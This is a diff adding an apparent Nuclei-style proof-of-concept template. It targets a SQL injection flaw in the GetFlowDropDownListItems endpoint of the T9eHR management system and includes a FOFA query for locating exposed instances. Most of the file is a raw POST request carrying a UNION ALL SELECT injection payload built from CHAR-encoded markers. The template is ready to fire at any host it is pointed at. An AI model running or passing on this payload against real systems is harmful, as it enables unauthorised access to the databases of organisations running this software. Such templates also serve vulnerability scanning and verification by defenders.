@@ -1,0 +1,36 @@
+id: poc-cagmu9zg7brd4948
+info:
+  name: 同鑫T9eHR信息化管理系统GetFlowDropDownListItems存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cagmu9zg7brd4948'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cagmu9zg7brd4948
+    fofa: body="T9eHR"
+http:
+- raw:
+  - 'POST /Common/GetFlowDropDownListItems HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    Content-Length: 33
+
+
+    FixedFormCode=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28109%29%2BCHAR%28107%29%2BCHAR%2886%29%2BCHAR%2897%29%2BCHAR%2897%29%2BCHAR%28115%29%2BCHAR%28107%29%2BCHAR%2879%29%2BCHAR%28111%29%2BCHAR%2898%29%2BCHAR%2871%29%2BCHAR%2871%29%2BCHAR%2876%29%2BCHAR%2865%29%2BCHAR%2868%29%2BCHAR%28103%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%2871%29%2BCHAR%28114%29%2BCHAR%2898%29%2BCHAR%2873%29%2BCHAR%28112%29%2BCHAR%28115%29%2BCHAR%2882%29%2BCHAR%28112%29%2BCHAR%28116%29%2BCHAR%2889%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28104%29%2BCHAR%2881%29%2BCHAR%28121%29%2BCHAR%28119%29%2BCHAR%28108%29%2BCHAR%28117%29%2BCHAR%28111%29%2BCHAR%28120%29%2BCHAR%28117%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29--+AHRN'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
